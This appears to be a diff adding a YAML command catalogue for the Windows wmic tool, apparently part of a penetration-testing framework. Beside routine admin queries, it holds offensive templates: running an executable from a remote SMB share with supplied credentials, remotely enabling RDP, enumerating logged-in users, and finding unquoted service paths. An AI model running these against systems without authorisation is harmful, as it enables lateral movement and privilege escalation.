@@ -1,0 +1,127 @@
+---
+name: wmic
+description: Displays WMI information inside an interactive command shell
+os: Windows
+ptf_module: null
+---
+commands:
+  - "List All Attributes":
+    - type: ["cmd","standalone"]
+    - text: "wmic {STR} get /?"
+    - input: ["alias"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List Callable Methods":
+    - type: ["cmd","standalone"]
+    - text: "wmic {STR} call /?"
+    - input: ["alias"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List Process Attributes":
+    - type: ["cmd","standalone"]
+    - text: "wmic process list full"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Show Domain and DC Info":
+    - type: ["cmd","standalone"]
+    - text: "wmic ntdomain list"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List All Patches":
+    - type: ["cmd","standalone"]
+    - text: "wmic qfe"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Execute Process":
+    - type: ["cmd","standalone"]
+    - text: "wmic process call create \"{STR}\""
+    - input: ["process name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Terminate Process":
+    - type: ["cmd","standalone"]
+    - text: "wmic process where name=\"{STR}\" call terminate"
+    - input: ["process name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "View Logical Shares":
+    - type: ["cmd","standalone"]
+    - text: "wmic logicaldisk get description,name"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Display CPU Bitness":
+    - type: ["cmd","standalone"]
+    - text: "wmic cpu get DataWidth /format:list"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Execute File Hosted over SMB on Remote System with Specified Credentials":
+    - type: ["cmd","standalone"]
+    - text: "wmic /node:{IPV4} /user:{STR}\\{STR} /password:{STR} process call create \"\\\\{IPV4}\\{STR}\\{FILE}\""
+    - input: ["target IPv4 address","domain","user","password","SMB IPv4 address","share name","executable file"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Get Software Names":
+    - type: ["cmd","standalone"]
+    - text: "wmic product get name /value"
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Uninstall Software":
+    - type: ["cmd","standalone"]
+    - text: "wmic product where name=\"{STR}\" call uninstall /nointeractive"
+    - input: ["product name"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Remotely Deermine Logged in User":
+    - type: ["cmd","standalone"]
+    - text: "wmic /node:{IPV4} computersystem get username"
+    - input: ["target IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Remote Process Listing Every Second":
+    - type: ["cmd","standalone"]
+    - text: "wmic /node:{IPV4} process list brief /every:1"
+    - input: ["target IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Remotely Start RDP":
+    - type: ["cmd","standalone"]
+    - text: "wmic /node:{IPV4} path Win32_TerminalServiceSetting where AllowTSConnections=\"0\" call SetAllowTSConnections \"1\""
+    - input: ["target IPv4 address"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "List Number of Times User has Logged On":
+    - type: ["cmd","standalone"]
+    - text: "wmic netlogin where (name like \"%{STR}%\") get numberoflogons"
+    - input: ["target user"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "Search for Services with Unquoted Paths to Binary":
+    - type: ["cmd","autonomous"]
+    - text: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"\""
+    - input: null
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
